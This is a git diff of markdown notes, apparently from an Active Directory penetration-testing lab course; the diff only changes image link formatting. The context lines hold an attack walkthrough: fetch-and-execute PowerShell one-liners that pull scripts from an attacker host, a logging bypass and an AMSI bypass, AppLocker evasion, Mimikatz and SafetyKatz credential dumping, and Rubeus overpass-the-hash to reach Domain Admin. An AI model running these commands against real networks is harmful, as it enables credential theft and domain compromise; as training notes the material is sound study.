@@ -5,7 +5,7 @@ importing SessionHunter (don't need admin access)
 
 Searching for active sessions
 `Invoke-SessionHunter -NoPortScan -RawResults -Targets C:\AD\Tools\servers.txt | select Hostname,UserSession,Access
-![[assets/Pasted image 20260204011936.png]]
+![Pasted image 20260204011936](assets/Pasted%20image%2020260204011936.png)
 
 
 ## Compromise the machine and escalate privileges to Domain Admin by abusing reverse shell on dcorp-ci
@@ -14,14 +14,14 @@ Download  script logging blocker onto compromised machine then run it (can use H
 `iex (iwr http://<IP>/sbloggingbypass.txt -UseBasicParsing)`
 **OR**
 you can just copy paste the bypass
-![[assets/Pasted image 20260204012406.png]]
+![Pasted image 20260204012406](assets/Pasted%20image%2020260204012406.png)
 
 Import PowerView onto compromised machine
 `iex ((New-Object Net.WebClient).DownloadString('http://<IP>/PowerView.ps1))`
 
 List the sessions on the domain (needs admin access)
 `Find-DomainUserLocation`
-![[assets/Pasted image 20260204012710.png]]
+![Pasted image 20260204012710](assets/Pasted%20image%2020260204012710.png)
 
 Test to see if user has access to above machine using winrs
 `winrs -r:dcorp-mgmt cmd /c "set computername && set username"`
@@ -42,7 +42,7 @@ now download SafetyKatz using port forwarding, now downloading from local loopba
 - using evasive-keys instead of ekeys since defender wouldn't like ekeys
 
 credentials for svcadmin (user with session) found in SafetyKatz output
-![[assets/Pasted image 20260204013753.png]]
+![Pasted image 20260204013753](assets/Pasted%20image%2020260204013753.png)
 - can see password in cleartext because there is a service on dcorp-mgmt that is running with the privileges of svcadmin
 - for this objective, we want the aes256 key
 
@@ -50,7 +50,7 @@ Use loader.exe to run Rubeus to get the Kerberos ticket (OPtH)
 `C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:<aes_key> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt`
 - will spawn a new process with svcadmin privileges, but whoami will show the old user (logon type 9)
 `winrs -r:dcorp-dc cmd /c set username`
-![[assets/Pasted image 20260204014308.png]]
+![Pasted image 20260204014308](assets/Pasted%20image%2020260204014308.png)
 
 
 ## Escalate privilege to DA by abusing derivative local admin through dcorp-adminsrv. On dcorp-adminrv, tackle allowlisting using
@@ -58,7 +58,7 @@ Use loader.exe to run Rubeus to get the Kerberos ticket (OPtH)
 - disable Applocker by modifying GPO applicable to dcorp-adminsrv
 
 Derivative local admin
-![[assets/Pasted image 20260204014642.png]]
+![Pasted image 20260204014642](assets/Pasted%20image%2020260204014642.png)
 - since student has administrative access to adminsrv, and adminsrv can get credentials for administrator on mgmt, student is a derivative admin of mgmt
 
 
@@ -67,7 +67,7 @@ access dcorp-adminsrv
 
 Fix AMSI bypass (script logging) when you get the error "Method Invocation is supported only on core types in this language mode"
 - happens to him when he enters a remote PowerShell session, not sure if that is all cases
-![[assets/Pasted image 20260204014940.png]]
+![Pasted image 20260204014940](assets/Pasted%20image%2020260204014940.png)
 - check language mode
 `$ExecutionContext.SessionState.LanguageMode
 - this error happens in ConstrainedLanguage
@@ -75,16 +75,16 @@ Fix AMSI bypass (script logging) when you get the error "Method Invocation is su
 
 confirm that there is Applocker on the machine
 `Get-AppLockerPolicy -Effective`
-![[assets/Pasted image 20260204015300.png]]
+![Pasted image 20260204015300](assets/Pasted%20image%2020260204015300.png)
 
 
 ### Gaps in Applocker
 look at Applocker rules
 `Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections`
 - UserOrGroupSid = S-1-1-0 -> everyone can run the binary
-![[assets/Pasted image 20260204015422.png]]
+![Pasted image 20260204015422](assets/Pasted%20image%2020260204015422.png)
 - can see that any user can run any binary from %PROGRAMFILES% and %WINDIR%
-![[assets/Pasted image 20260204015501.png]]
+![Pasted image 20260204015501](assets/Pasted%20image%2020260204015501.png)
 - can use Invoke-Mimikatz in %PROGRAMFILES%
 	- says "this will be the only situation we will use Invoke-Mimikatzs
 
@@ -119,10 +119,10 @@ Invoke-Mimi -Command $Pwn
 ```
 - append to end of Invoke-Mimi, save new copy as Invoke-MimiEx-keys-std1.ps1
 - also prevents detection
-![[assets/Pasted image 20260204031631.png]]
+![Pasted image 20260204031631](assets/Pasted%20image%2020260204031631.png)
 
 `./Invoke-MimiEx-keys-std1.ps1`
-![[assets/Pasted image 20260204031606.png]]
+![Pasted image 20260204031606](assets/Pasted%20image%2020260204031606.png)
 
 can also do the same for credential vault, but it doesn't need to be encoded
 - just add the following to the end of Invoke-Mimi.ps1
@@ -130,11 +130,11 @@ can also do the same for credential vault, but it doesn't need to be encoded
 Invoke-Mimi -Command '"token::elevate" "vault::cred /patch"'
 ```
 - name this new copy Invoke-MimiEx-vault-std1.ps1
-![[assets/Pasted image 20260204031938.png]]
+![Pasted image 20260204031938](assets/Pasted%20image%2020260204031938.png)
 
 run credential manager dump on Invoke-MimiEx-vault-std.ps1
 `.\Invoke-MimiEz-vault-std1.ps1`
-![[assets/Pasted image 20260204032148.png]]
+![Pasted image 20260204032148](assets/Pasted%20image%2020260204032148.png)
 - aes key is a little below this
 
 can log in with srvadmin using runas
@@ -144,7 +144,7 @@ can log in with srvadmin using runas
 Check if srvadmin has administrative access on any machines
 `. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1`
 `Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local -Verbose`
-![[assets/Pasted image 20260204032554.png]]
+![Pasted image 20260204032554](assets/Pasted%20image%2020260204032554.png)
 
 
 next steps are the same as the reverse shell exploitation, just using a different path
@@ -165,7 +165,7 @@ open Group Policy Management
 `gpmc.msc`
 
 edit Applocker from Domains > \<DOMAIN\> > Applocked > Applocker
-![[assets/Pasted image 20260204033407.png]]
+![Pasted image 20260204033407](assets/Pasted%20image%2020260204033407.png)
 
 edit the policy through Computer Configuration > Policies > Windows Settings > Security Settings > Application Control Policies > Applocker > Executable Rules > Delete Executable Rules
 
